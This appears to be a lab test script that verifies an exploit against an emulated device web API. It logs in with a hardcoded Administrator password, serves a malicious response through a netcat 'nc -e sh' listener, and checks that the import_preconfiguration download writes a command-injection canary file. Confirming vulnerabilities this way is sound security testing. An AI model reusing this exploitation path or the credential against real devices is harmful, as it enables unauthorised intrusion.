#!/bin/sh
set -eu

BASE=http://127.0.0.1:18082/cgi-bin
CANARY=/opt/setup/templates/download-canary
AUTH=
SERVER_PID=
NC_PID=

cleanup() {
  set +e
  rm -f "$CANARY"
  if [ -n "$AUTH" ]; then
    rm -f "/dev/shm/usp_$AUTH"
    rm -rf "/opt/tmp/$AUTH"
  fi
  if [ -n "$NC_PID" ]; then
    kill "$NC_PID" 2>/dev/null
    wait "$NC_PID" 2>/dev/null
  fi
  if [ -n "$SERVER_PID" ]; then
    kill "$SERVER_PID" 2>/dev/null
    wait "$SERVER_PID" 2>/dev/null
  fi
}
trap cleanup EXIT INT TERM

post() {
  /bin/busybox wget -qO- --post-data "$1" "$BASE/$2"
}

rm -f "$CANARY"
/bin/busybox nc -ll -p 8080 -e /bin/busybox sh /lab/fixtures/malicious-response.sh &
NC_PID=$!
/usr/bin/qemu-i386 -L / /usr/sbin/lighttpd -f /etc/lighttpd/lighttpd.conf -D &
SERVER_PID=$!
for attempt in 1 2 3 4 5 6 7 8 9 10; do
  if /bin/busybox wget -qO- "$BASE/sysinfo.lua" >/dev/null; then
    break
  fi
  sleep 1
done

DENIED=$(post 'action=import_preconfiguration&input=server&server_url=http://127.0.0.1:8080/probe&username=x&password=x' api.lua)
case "$DENIED" in
  *'"error":"PERMISSION_DENIED"'*) ;;
  *) echo "FAIL no-session control: $DENIED"; exit 1;;
esac
echo "PASS import_preconfiguration requires authorization"

AUTH_RESPONSE=$(post 'action=authenticate&username=Administrator&password=O0ANI3' api.lua)
case "$AUTH_RESPONSE" in
  *'"status":"ok"'*'"auth":"SSES'*) ;;
  *) echo "FAIL Administrator authentication: $AUTH_RESPONSE"; exit 1;;
esac
AUTH=${AUTH_RESPONSE#*\"auth\":\"}
AUTH=${AUTH%%\"*}
echo "PASS Administrator authentication"

RESPONSE=$(post "action=import_preconfiguration&input=server&server_url=http://127.0.0.1:8080/probe&auth=$AUTH" api.lua) || true
echo "import response: $RESPONSE"
[ "$(cat "$CANARY")" = "DOWNLOAD_CANARY" ] || { echo "FAIL download filename canary"; exit 1; }
echo "PASS filename_effective command canary"
echo "overall: PASS"
